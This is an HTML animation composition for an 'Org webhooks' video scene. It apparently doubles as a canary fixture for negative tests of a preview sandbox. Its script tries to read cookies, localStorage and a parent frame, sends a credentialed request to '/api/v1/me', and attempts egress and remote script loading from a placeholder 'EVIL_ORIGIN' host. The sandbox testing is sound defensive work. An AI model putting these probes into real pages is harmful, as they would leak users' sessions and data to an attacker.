<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <script src="vendor/gsap.min.js"></script>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div
      id="root"
      data-composition-id="main"
      data-start="0"
      data-duration="5"
      data-width="1920"
      data-height="1080"
    >
      <div id="scene" class="clip" data-start="0" data-duration="5" data-track-index="0">
        <img id="logo" src="assets/logo.svg" alt="" />
        <h1 id="title">Org webhooks</h1>
        <p id="sub">One subscription for every project</p>
        <video
          id="clip"
          src="assets/media/clip.mp4"
          muted
          playsinline
          data-start="0"
          data-duration="2"
        ></video>
      </div>
      <div
        id="outro"
        data-composition-src="compositions/outro.html"
        data-start="3"
        data-duration="2"
        data-track-index="1"
      ></div>
    </div>
    <script>
      window.__timelines = window.__timelines || {}
      const tl = gsap.timeline({ paused: true })
      tl.fromTo('#title', { opacity: 0 }, { opacity: 1, duration: 0.5 }, 0.2)
      window.__timelines['main'] = tl
      // Canary (spike S2 negative tests): everything here must fail inside the preview sandbox.
      window.__canary = {}
      try {
        window.__canary.cookie = document.cookie
      } catch (e) {
        window.__canary.cookie = 'blocked'
      }
      try {
        window.__canary.parent = String(parent.parent.document.title)
      } catch (e) {
        window.__canary.parent = 'blocked'
      }
      try {
        window.__canary.storage = String(localStorage.length)
      } catch (e) {
        window.__canary.storage = 'blocked'
      }
      fetch('/api/v1/me', { credentials: 'include' }).then(
        (r) => {
          window.__canary.fetch = 'status ' + r.status
        },
        () => {
          window.__canary.fetch = 'blocked'
        },
      )
      const egress = new Image()
      egress.src = 'EVIL_ORIGIN/egress-img'
      fetch('EVIL_ORIGIN/egress-fetch').catch(() => {})
      const s = document.createElement('script')
      s.src = 'EVIL_ORIGIN/egress-script.js'
      document.head.appendChild(s)
    </script>
  </body>
</html>
